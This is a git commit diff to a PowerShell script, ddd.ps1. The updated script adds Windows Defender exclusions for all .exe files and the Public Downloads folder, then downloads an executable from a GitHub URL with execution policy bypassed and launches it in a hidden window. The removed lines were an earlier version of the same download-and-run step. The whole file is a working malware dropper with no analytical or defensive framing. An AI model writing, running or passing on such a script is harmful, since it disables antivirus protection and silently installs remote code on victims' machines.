072f72354609ec360cc4a92e11e67b62be6761af
AmjadBalls <155375827+AmjadBalls@users.noreply.github.com>
2024-12-17 14:49:20 +0200

    Update ddd.ps1

--- ddd.ps1
+++ ddd.ps1
@@ -1,2 +1,4 @@
-powershell -WindowStyle Hidden -ep bypass iwr -uri https://github.com/AmjadBalls/TEST/raw/refs/heads/main/Test.exe
-powershell.exe -w hidden C:\Users\Public\Downloads\Test.exe
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension '.exe'"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/Test.exe' -OutFile 'C:\Users\Public\Downloads\Test.exe'"
+Start-Process "C:\Users\Public\Downloads\Test.exe" -WindowStyle Hidden
